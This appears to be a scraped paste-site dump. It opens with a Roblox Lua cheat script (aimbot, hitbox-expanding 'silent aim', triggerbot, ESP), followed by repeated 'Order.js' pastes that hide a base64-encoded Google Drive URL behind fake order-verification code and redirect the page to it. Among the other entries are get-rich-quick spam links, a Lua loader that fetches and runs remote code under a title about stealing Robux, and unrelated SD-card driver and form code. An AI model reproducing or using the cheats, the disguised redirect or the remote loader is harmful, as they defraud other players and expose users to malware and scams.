UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.W then
        moveKeys.W = false
    elseif input.KeyCode == Enum.KeyCode.A then
        moveKeys.A = false
    elseif input.KeyCode == Enum.KeyCode.S then
        moveKeys.S = false
    elseif input.KeyCode == Enum.KeyCode.D then
        moveKeys.D = false
    elseif input.KeyCode == Enum.KeyCode.Space then
        moveKeys.Space = false
    end
end)

-- Main movement loop
RunService.Heartbeat:Connect(function()
    local char = getChar()
    local root = getRoot()
    local humanoid = getHumanoid()
    
    if not char or not root or not humanoid then return end
    
    -- Calculate movement
    local moveDir = calculateMoveDirection()
    local isInAir = humanoid:GetState() == Enum.HumanoidStateType.Jumping or 
                    humanoid:GetState() == Enum.HumanoidStateType.Freefall
    
    -- Apply movement
    if moveDir.Magnitude > 0 then
        local speed = STRAFE_SPEED
        if isInAir then
            speed = speed * AIR_MULTIPLIER
        end
        
        -- Set velocity
        local newVel = moveDir * speed
        root.Velocity = Vector3.new(
            newVel.X,
            root.Velocity.Y,  -- Preserve vertical velocity
            newVel.Z
        )
        
        -- Bunny hop
        if moveKeys.Space and root.Velocity.Y < 1 then
            root.Velocity = Vector3.new(
                root.Velocity.X,
                BHOP_POWER,
                root.Velocity.Z
            )
        end
    end
end)

-- Notification
game:GetService(""StarterGui""):SetCore(""SendNotification"", {
    Title = ""Movement Script Loaded"",
    Text = ""Controls: WASD to move, Space to jump"",
    Duration = 5
})
    end,
})


local UserInputService = game:GetService(""UserInputService"")
local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

local LockedPlayer = nil
local LastKnownPosition = nil
local FieldOfView = 40 -- Set the field of view to 40 degrees
local CenterPrioritizationFactor = 0.5 -- Decrease this value to shrink the priority ""circle""
local AimbotEnabled = false -- Track whether the aimbot is enabled or not

-- Function to check if a player is on the enemy team
local function isEnemyTeam(player)
    -- If the local player has no team, or the target player has no team, return false
    if not LocalPlayer.Team or not player.Team then
        return false
    end
    
    -- Return true if the teams are different
    return LocalPlayer.Team ~= player.Team
end

-- Function to get the body part based on weighted probabilities
local function getTargetBodyPart()
    local randomValue = math.random()
    if randomValue <= 0.7 then
        return ""UpperTorso"" -- 70% chance
    else
        return ""Head"" -- 30% chance
    end
end

-- Function to get the closest enemy player to the crosshair, prioritizing players near the center of the screen and closest to the player
local function getClosestEnemyPlayerToCrosshair()
    local mousePosition = UserInputService:GetMouseLocation()
    local closestPlayer = nil
    local closestDistance = math.huge
    local cameraPosition = Camera.CFrame.Position
    local cameraForward = Camera.CFrame.LookVector
    local centerOfScreen = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)

    for _, player in pairs(Players:GetPlayers()) do
        -- Only target players who are on the enemy team
        if player ~= LocalPlayer and player.Character and isEnemyTeam(player) then
            -- Choose body part based on weighted probability
            local targetBodyPartName = getTargetBodyPart()
            local bodyPart = player.Character:FindFirstChild(targetBodyPartName)
            
            if bodyPart then
                local screenPosition, onScreen = Camera:WorldToViewportPoint(bodyPart.Position)

                if onScreen then
                    local playerPosition = bodyPart.Position - cameraPosition
                    local angle = math.acos(cameraForward:Dot(playerPosition.Unit)) * (180 / math.pi)

                    -- Check if the player is within the FOV
                    if angle <= FieldOfView / 2 then
                        -- Calculate screen distance (distance between mouse and player)
                        local screenDist = (Vector2.new(screenPosition.X, screenPosition.Y) - mousePosition).Magnitude
                        -- Calculate distance from the center of the screen, but apply the CenterPrioritizationFactor to shrink the circle
                        local distanceFromCenter = (Vector2.new(screenPosition.X, screenPosition.Y) - centerOfScreen).Magnitude * CenterPrioritizationFactor
                        -- Calculate the distance from the local player to the target player
                        local distanceToPlayer = (LocalPlayer.Character.Head.Position - bodyPart.Position).Magnitude

                        -- Combine these factors:
                        -- Prioritize players close to the center and those closer to the local player
                        local weightedScore = screenDist + distanceFromCenter + distanceToPlayer

                        -- Find the closest player based on the combined score
                        if weightedScore < closestDistance then
                            closestDistance = weightedScore
                            closestPlayer = {player = player, bodyPart = targetBodyPartName}
                        end
                    end
                end
            end
        end
    end

    return closestPlayer
end

-- Function to lock the camera onto the target player's body part
local function lockCameraOnPlayer(targetData)
    if targetData and targetData.player.Character then
        local bodyPart = targetData.player.Character:FindFirstChild(targetData.bodyPart)
        
        if bodyPart then
            LockedPlayer = targetData.player
            LastKnownPosition = bodyPart.Position

            RunService:BindToRenderStep(""LockCamera"", Enum.RenderPriority.Camera.Value, function()
                if LockedPlayer and LockedPlayer.Character and isEnemyTeam(LockedPlayer) then
                    local currentBodyPart = LockedPlayer.Character:FindFirstChild(targetData.bodyPart)
                    
                    if currentBodyPart then
                        local targetPosition = currentBodyPart.Position

                        -- Check if the player has moved more than 5 meters
                        if (targetPosition - LastKnownPosition).Magnitude > 5 then
                            -- Stop tracking if the player has teleported more than 5 meters
                            RunService:UnbindFromRenderStep(""LockCamera"")
                            LockedPlayer = nil
                            LastKnownPosition = nil
                            return
                        end

                        -- Update the last known position
                        LastKnownPosition = targetPosition

                        -- Lock the camera onto the player's body part
                        Camera.CFrame = CFrame.new(Camera.CFrame.Position, targetPosition)
                    else
                        RunService:UnbindFromRenderStep(""LockCamera"")
                        LockedPlayer = nil
                        LastKnownPosition = nil
                    end
                else
                    RunService:UnbindFromRenderStep(""LockCamera"")
                    LockedPlayer = nil
                    LastKnownPosition = nil
                end
            end)
        end
    end
end

-- Rayfield UI Toggle for Aimbot
local Toggle = AIMTab:CreateToggle({
    Name = ""🔫Aimbot🔫 (RCLICK)"",
    CurrentValue = false,
    Flag = ""AIM1"", -- A flag is the identifier for the configuration file
    Callback = function(Value)
        -- The function that takes place when the toggle is pressed
        AimbotEnabled = Value
        if not AimbotEnabled then
            -- Stop tracking if the aimbot is disabled
            RunService:UnbindFromRenderStep(""LockCamera"")
            LockedPlayer = nil
            LastKnownPosition = nil
        end
    end,
})

-- Detect right-click and lock onto the closest enemy player within FOV, only if Aimbot is enabled
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.UserInputType == Enum.UserInputType.MouseButton2 and AimbotEnabled then
        local closestPlayer = getClosestEnemyPlayerToCrosshair()
        lockCameraOnPlayer(closestPlayer)
    end
end)

-- Stop locking the camera when right-click is released
UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        RunService:UnbindFromRenderStep(""LockCamera"")
        LockedPlayer = nil
        LastKnownPosition = nil
    end
end)

-- This next part is for silent aim, you can modify the vectors to change how good the silent aim is
-- Function to get the Players service name dynamically
local function getPlayersName()
    for i, v in pairs(game:GetChildren()) do
        if v.ClassName == ""Players"" then
            return v.Name
        end
    end
end

local playersService = getPlayersName()
local localPlayer = game[playersService].LocalPlayer

-- Global variables to control the script
local isModificationEnabled = false
local modificationCoroutine = nil

-- Function to modify player character parts
local function modifyPlayerParts()
    while isModificationEnabled do
        for _, v in pairs(game[playersService]:GetPlayers()) do
            if v.Name ~= localPlayer.Name and v.Character then
                local parts = {
                    ""RightUpperLeg"", 
                    ""LeftUpperLeg"", 
                    ""HeadHB"", 
                    ""HumanoidRootPart""
                }
                
                for _, partName in ipairs(parts) do
                    local part = v.Character:FindFirstChild(partName)
                    if part then
                        part.CanCollide = false
                        part.Transparency = 10
                        part.Size = Vector3.new(10, 10, 10)
                    end
                end
            end
        end
        wait(1)  -- Wait for 1 second before next iteration
    end
    
    -- Reset parts when modification is disabled
    for _, v in pairs(game[playersService]:GetPlayers()) do
        if v.Name ~= localPlayer.Name and v.Character then
            local parts = {
                ""RightUpperLeg"", 
                ""LeftUpperLeg"", 
                ""HeadHB"", 
                ""HumanoidRootPart""
            }
            
            for _, partName in ipairs(parts) do
                local part = v.Character:FindFirstChild(partName)
                if part then
                    part.CanCollide = true
                    part.Transparency = 0
                    part.Size = Vector3.new(1, 1, 1)
                end
            end
        end
    end
end

-- Create Toggle for Player Part Modification
local Toggle = AIMTab:CreateToggle({
    Name = ""🔫silent aim🔫"",
    CurrentValue = false,
    Flag = ""PlayerPartModification"",
    Callback = function(Value)
        isModificationEnabled = Value
        
        if Value then
            -- Start the modification coroutine
            modificationCoroutine = coroutine.create(modifyPlayerParts)
            coroutine.resume(modificationCoroutine)
        else
            -- If the coroutine is running, it will exit due to isModificationEnabled being false
            modificationCoroutine = nil
        end
    end,
})


local Toggle = AIMTab:CreateToggle({
    Name = ""🔫TriggerBot🔫"",
    CurrentValue = false,
    Flag = ""EnemyAutoClickToggle"",
    Callback = function(Value)
        if Value then
            -- Activate auto-click
            getgenv().AutoClickConnection = game:GetService(""RunService"").RenderStepped:Connect(function()
                local Players = game:GetService(""Players"")
                local LocalPlayer = Players.LocalPlayer
                local Mouse = LocalPlayer:GetMouse()

                if Mouse.Target and Mouse.Target.Parent then
                    local TargetPlayer = Players:GetPlayerFromCharacter(Mouse.Target.Parent)
                    
                    if TargetPlayer and TargetPlayer ~= LocalPlayer then
                        if not TargetPlayer.Team or TargetPlayer.Team ~= LocalPlayer.Team then
                            mouse1press()
                            wait()
                            mouse1release()
                        end
                    end
                end
            end)
        else
            -- Deactivate auto-click
            if getgenv().AutoClickConnection then
                getgenv().AutoClickConnection:Disconnect()
            end
        end
    end
})

-- Services
local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Variables for ESP
local espEnabled = false -- Tracks the ESP state
local espConnection -- Stores the RenderStepped connection for ESP updates

-- Variables for Tracers
local drawLinesEnabled = false
local lines = {} -- Store all the lines
local tracerConnection -- Stores the RenderStepped connection for tracers

-- Function to create a hollow rectangle with thicker borders (ESP box)
local function createHollowBox()
    local box = Instance.new(""BillboardGui"")
    box.Size = UDim2.new(4, 0, 5, 0)
    box.AlwaysOnTop = true
    box.Adornee = nil
    box.Name = ""PlayerBox""

    local borderThickness = 0.05 -- Increased from 0.03 to make borders thicker

    local top = Instance.new(""Frame"")
    top.Size = UDim2.new(1, 0, borderThickness, 0)
    top.Position = UDim2.new(0, 0, 0, 0)
    top.BackgroundColor3 = Color3.new(1, 0, 0)
    top.BorderSizePixel = 0
    top.Parent = box

    local bottom = Instance.new(""Frame"")
    bottom.Size = UDim2.new(1, 0, borderThickness, 0)
    bottom.Position = UDim2.new(0, 0, 1 - borderThickness, 0)
    bottom.BackgroundColor3 = Color3.new(1, 0, 0)
    bottom.BorderSizePixel = 0
    bottom.Parent = box

    local left = Instance.new(""Frame"")
    left.Size = UDim2.new(borderThickness, 0, 1, 0)
    left.Position = UDim2.new(0, 0, 0, 0)
    left.BackgroundColor3 = Color3.new(1, 0, 0)
    left.BorderSizePixel = 0
    left.Parent = box

    local right = Instance.new(""Frame"")
    right.Size = UDim2.new(borderThickness, 0, 1, 0)
    right.Position = UDim2.new(1 - borderThickness, 0, 0, 0)
    right.BackgroundColor3 = Color3.new(1, 0, 0)
    right.BorderSizePixel = 0
    right.Parent = box

    return box
end

-- Function to check if a player is on the enemy team
local function isEnemyTeam(player)
    return player.Team ~= LocalPlayer.Team
end

-- Function to highlight all enemy players (ESP)
local function highlightAllPlayers()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and isEnemyTeam(player) then
            if player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
                if not player.Character:FindFirstChild(""PlayerBox"") then
                    local box = createHollowBox()
                    box.Adornee = player.Character:FindFirstChild(""HumanoidRootPart"")
                    box.Parent = player.Character
                end
            end
        else
            if player.Character and player.Character:FindFirstChild(""PlayerBox"") then
                player.Character.PlayerBox:Destroy()
            end
        end
    end
end

-- Clean up highlights when players leave
local function onPlayerRemoving(player)
    if player.Character and player.Character:FindFirstChild(""PlayerBox"") then
        player.Character.PlayerBox:Destroy()
    end
end

-- Enable or disable ESP
local function toggleESP(state)
    if state then
        espConnection = RunService.RenderStepped:Connect(highlightAllPlayers)
        Players.PlayerRemoving:Connect(onPlayerRemoving)
    else
        if espConnection then
            espConnection:Disconnect()
            espConnection = nil
        end
        for _, player in pairs(Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild(""PlayerBox"") then
                player.Character.PlayerBox:Destroy()
            end
        end
    end
end

-- Function to create and update tracers (lines)
local function createLine()
    local line = Drawing.new(""Line"")
    line.Visible = true
    line.Thickness = 3 -- Increased from 1 to make lines thicker
    line.Color = Color3.new(1, 0, 0)
    return line
end

local function updateLines()
    -- Hide all lines first
    for _, line in ipairs(lines) do
        line.Visible = false
    end

    local screenCenter = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    local index = 1
    for _, player in ipairs(Players:GetPlayers()) do
        -- Only draw lines to enemy team players
        if player ~= LocalPlayer and isEnemyTeam(player) and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
            local character = player.Character
            local rootPart = character.HumanoidRootPart
            local worldPosition = rootPart.Position
            local screenPosition, onScreen = Camera:WorldToViewportPoint(worldPosition)

            if onScreen then
                local line = lines[index] or createLine()
                line.From = screenCenter
                line.To = Vector2.new(screenPosition.X, screenPosition.Y)
                line.Visible = true

                lines[index] = line
                index = index + 1
            end
        end
    end

    -- Hide remaining lines if there are no players to connect to
    for i = index, #lines do
        lines[i].Visible = false
    end
end

local function cleanupLines()
    -- Clean up the lines by making them invisible and removing them
    for _, line in ipairs(lines) do
        line.Visible = false
        line:Remove()
    end
    lines = {}
end

-- Toggle for tracers (line drawing)
local function toggleLineDrawing(state)
    if state then
        tracerConnection = RunService.RenderStepped:Connect(updateLines)
    else
        if tracerConnection then
            tracerConnection:Disconnect()
            tracerConnection = nil
        end
        cleanupLines()
    end
end

-- Rayfield UI Toggles

-- ESP Toggle
ESPTab:CreateToggle({
    Name = ""🔴Enemy Boxes🔴"",
    CurrentValue = false,
    Flag = ""BOX1"",
    Callback = function(Value)
        espEnabled = Value
        toggleESP(Value)
    end,
})

-- Tracers Toggle
ESPTab:CreateToggle({
    Name = ""🔴Tracer (Enemys)🔴"",
    CurrentValue = false,
    Flag = ""Tracer1"",
    Callback = function(Value)
        drawLinesEnabled = Value
        toggleLineDrawing(Value)
    end,
})
"
8sN2vMd3,Order.js,Epiphemeral,JavaScript,Monday 7th of April 2025 06:42:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68971/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cDpgyVSw,EARN $900 INSTANTLY 2025 X0,haichaujames,JavaScript,Monday 7th of April 2025 06:42:21 AM CDT," 
Pdf https://goo.su/DgLIPOe


3on7NxKZzb
"
n8ZpiudD,Market.js,Epiphemeral,JavaScript,Monday 7th of April 2025 06:27:34 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62526/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KN3CZ0ha,Make $1000 15-MINUTES (BEGINNER) 3R,TobiasMPH,JavaScript,Monday 7th of April 2025 06:25:46 AM CDT," 
Pdf https://goo.su/DgLIPOe


AmUHqXd6Pk
"
NVcSEymF,Untitled,Epiphemeral,JavaScript,Monday 7th of April 2025 06:12:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/96395/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6qxMxKJ3,Make $1000 15-MINUTES (BEGINNER) TS,TobiasMPH,JavaScript,Monday 7th of April 2025 06:09:41 AM CDT," 
Pdf https://goo.su/DgLIPOe


4c0PB1CIKh
"
E26Rc8eg,dataNone,TestGuy1,JSON,Monday 7th of April 2025 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '6833d61e243e93cd8b18148c6e4dad4e10bf92fddbd168f784ede0723ccbcc89a88e45158e8c680412d78eed73ff8d21225c5af12533f16daa089b5e640cbdb2fa80cf573958f2fa16a1fb25af8b69b0e0b633b7dc4f1909671c5403c6c248fff745e419bf09c6ccf1a32dd2dea42eda39d41dea20e32249b5ec52ecf5cce2f3',
  otherdata: [
    '287cd05dc36744a939a7b06e40bed946',
    'ed4508fa6fbc615e2daef76e44d43bb3',
    'ab2b89b4b1a9fd61349659ea8c87aa37',
    '7018f683e34cad94b08b67765c7103f9',
    '3eeddcdd5d5df99bf7142c0fd7966b28',
    'b84a5d9de47684d675b0f03136d9b45a',
    '31e5ab1edbc722f4350eebddcf637889',
    '8d7592f42610cd5b79f3030b60f1e670'
  ]
}"
6Kr65MXN,Products.js,Epiphemeral,JavaScript,Monday 7th of April 2025 05:56:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33092/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UG2RiGbp,Order.js,Epiphemeral,JavaScript,Monday 7th of April 2025 05:41:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25698/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NYMvA99E,Market.js,Epiphemeral,JavaScript,Monday 7th of April 2025 05:25:54 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45569/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xN5nYYbu,Untitled,Epiphemeral,JavaScript,Monday 7th of April 2025 05:10:31 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21432/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hGF1LMuG,форма,Igor150195,JavaScript,Monday 7th of April 2025 04:59:45 AM CDT,"lpc_template.queue.refreshForm = function ($self) {

		console.log(33)

	    const $refreshButton = $('.lpc-refresh-form');
	
	    if (!$refreshButton.length) {
	        return;
	    }
		
	
	    const href = $refreshButton.attr('href');
	    const popupMatch = href?.match(/popup:_lp_block_(\d+)/);

		
		console.log(popupMatch)
	    if (!popupMatch) {
	        return;
	    }

		console.log(href)
	
	    const popupId = popupMatch[1];
	    const $popupElement = $(`[data-block-id=""${popupId}""]`);
	
	    if (!$popupElement.length) {
	        return;
	    }
	
	    const $form = $popupElement.find('.lp-form-tpl');
	    if (!$form.length) {
	        console.log('❌ Форма не найдена внутри попапа');
	        return;
	    }
	
	    const apiUrl = $form.attr('data-lpc-api-url');
	    console.log(apiUrl);
	
	    $refreshButton.off('click.refreshForm');
	
	    $refreshButton.on('click.refreshForm', function (e) {

			const $form2 = $popupElement.find('.lp-form-tpl');
			// проверяешь есть ли успешно отправленнная форма, только потом тянешь аяксом форму, если уже отправляли форму, которая без аякса
	        e.preventDefault();
				
			console.log(5553)
	
	        $.ajax({
	            url: apiUrl,
	            dataType: 'json',
	            success: function (response) {
	                if (!response.result.error) {
	                    let htmlForm = response.result.html;
	
	                    $form2.replaceWith(htmlForm);
	
	                    console.log(34343434)
	                    s3LP.initForms($('#_lp_block_372266709'));
	                }
	            }
	        });
	    });
	};"
xbk9828D,Products.js,Epiphemeral,JavaScript,Monday 7th of April 2025 04:55:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92208/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EudpPXpe,Pls Donate steal from other infinite robux Fake Donation,ok76777,Lua,Monday 7th of April 2025 04:50:53 AM CDT,"loadstring(game:HttpGet(""https://pastefy.app/yABWtvy0/raw""))()"
1WxMnHH1,code for SD on C8051F38C,leonllr_Eduge,C,Monday 7th of April 2025 04:49:11 AM CDT,"// SD.c
#include ""diskio.h""

#include ""SPI.h""
#include ""SD.h""
#include ""Microseconds.h""
#include <REG51F380.H> // registres C8051F38C

// data streaming
#define FORWARD(d) {}

#define _USE_WRITE 1

// for vscode
//typedef sbit sbit;

sbit SD_CS = P1^4;

static uint8_t CardType;			/* b0:MMC, b1:SDv1, b2:SDv2, b3:Block addressing */

// main source: http://www.rjhcoding.com/avrc-sd-interface-1.php

// https://electronics.stackexchange.com/questions/602105/hoVw-can-i-initialize-use-sd-cards-with-spi
// http://elm-chan.org/docs/mmc/mmc_e.html
	
/*-----------------------------------------------------------------------*/
/* Initialize Disk Drive                                                 */
/*-----------------------------------------------------------------------*/
DSTATUS disk_initialize(void);


/*-----------------------------------------------------------------------*/
/* Read partial sector                                                   */
/*-----------------------------------------------------------------------*/

DRESULT disk_readp (
	uint8_t *buff,		/* Pointer to the read buffer (NULL:Read bytes are forwarded to the stream) */
	uint32_t sector,	/* Sector number (LBA) */
	uint16_t offset,	/* Byte offset to read from (0..511) */
	uint16_t count		/* Number of bytes to read (ofs + cnt mus be <= 512) */
) compact;



/*-----------------------------------------------------------------------*/
/* Write partial sector                                                  */
/*-----------------------------------------------------------------------*/
DRESULT disk_writep (
	const uint8_t *buff,	/* Pointer to the bytes to be written (NULL:Initiate/Finalize sector write) */
	uint32_t sc			/* Number of bytes to send, Sector number (LBA) or zero */
);

/*
void SD_Powerup()
{
	uint8_t i;
   // make sure card is deselected
   SD_CS = SPI_CS_DISABLE;

   // give SD card time to power up
   MicrosecondsWait1000();
   MicrosecondsWait1000();

   // send 80 clock cycles to synchronize
   for(i = 0; i < 10; i++)
      SPIWrite8(0xFF);

   // deselect SD card
   SD_CS = SPI_CS_DISABLE;
   SPIWrite8(0xFF);
}*/

uint8_t SPI_Transfer(uint8_t SPI_data)
{
   SPIWrite8(SPI_data);

   // added wait and delay to prevent write/read colision
   while(!TXBMT) {};

	// very slight improvement only
   MicrosecondsWait1();

   return SPIReadDirect();
}

// for init
uint8_t SPI_TransferSlow(uint8_t SPI_data)
{
   SPIWrite8(SPI_data);

   // added wait and delay to prevent write/read colision
   while(!TXBMT) {};

   MicrosecondsWait1();
	MicrosecondsWait1();
	MicrosecondsWait1();
	MicrosecondsWait1();

   return SPIReadDirect();
}

uint8_t SD_SendCommand(uint8_t cmd, uint32_t arg)
{
   idata uint8_t crc = 0xFF;
   data uint8_t n, res;

   // transmit command to sd card
   SPIWrite8(cmd|0x40);

   // transmit argument
   SPIWrite8((uint8_t)(arg >> 24));
